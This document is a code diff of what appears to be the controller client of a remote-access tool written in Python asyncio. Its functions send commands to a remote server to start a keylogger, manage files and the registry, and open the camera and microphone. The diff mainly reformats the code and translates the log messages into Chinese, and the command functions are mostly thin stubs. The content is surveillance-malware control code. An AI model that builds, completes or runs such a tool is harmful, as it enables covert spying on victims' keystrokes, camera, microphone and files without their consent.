@@ -9,11 +9,12 @@ operation_map = {
     "keylogger": "Keylogger started"
 }
 
+
 async def connected(GUI):
     try:
         server_address = (GUI.ipInput.text(), GUI.portInput.text())
         GUI.append_log(
-            f"[*] Connecting to: {server_address[0]}:{server_address[1]}")
+            f"[*] 正在连接到: {server_address[0]}:{server_address[1]}")
         for key in GUI.connections:
             reader, writer = await asyncio.open_connection(*server_address)
             GUI.connections[key]['reader'] = reader
@@ -22,23 +23,24 @@ async def connected(GUI):
             writer.write(operation.encode())
             await writer.drain()
             response = await reader.read(1024)
-            if(response.decode('utf-8')!=operation_map[key]):
-                GUI.append_log(f"[!] operation start failed")
+            if (response.decode('utf-8') != operation_map[key]):
+                GUI.append_log(
+                    f"[!] 操作{operation}响应错误: {response.decode('utf-8')}")
                 return
         reader, writer = await asyncio.open_connection(*server_address)
         GUI.append_log(
-                f"[*] Connected to: {server_address[0]}:{server_address[1]}")
+            f"[*] 已连接到: {server_address[0]}:{server_address[1]}")
     except OSError as e:
-        GUI.append_log(f"[!] Network error: {e}")
+        GUI.append_log(f"[!] 网络错误: {e}")
     except Exception as e:
-        GUI.append_log(f"[!] Unexpected error: {e}")
+        GUI.append_log(f"[!] 未知错误: {e}")
+
 
 async def disconnected(GUI):
     for key in GUI.connections:
         GUI.connections[key]['writer'].close()
         await GUI.connections[key]['writer'].wait_closed()
     GUI.append_log("[*] Connection closed")
-    
 
 
 async def fileManager(GUI):
@@ -55,6 +57,7 @@ async def fileManager(GUI):
     except Exception as e:
         GUI.append_log(f"[!] Unexpected error: {e}")
 
+
 async def regmanager(GUI):
     # 这里放具体的操作
     try:
@@ -68,6 +71,7 @@ async def regmanager(GUI):
         GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
     except Exception as e:
         GUI.append_log(f"[!] Unexpected error: {e}")
+
 
 async def opencamera(GUI):
     # 这里放具体的操作
@@ -83,6 +87,7 @@ async def opencamera(GUI):
     except Exception as e:
         GUI.append_log(f"[!] Unexpected error: {e}")
 
+
 async def openmicrophone(GUI):
     # 这里放具体的操作
     try:
@@ -96,6 +101,7 @@ async def openmicrophone(GUI):
         GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
     except Exception as e:
         GUI.append_log(f"[!] Unexpected error: {e}")
+
 
 async def keylogger(GUI):
     # 这里放具体的操作
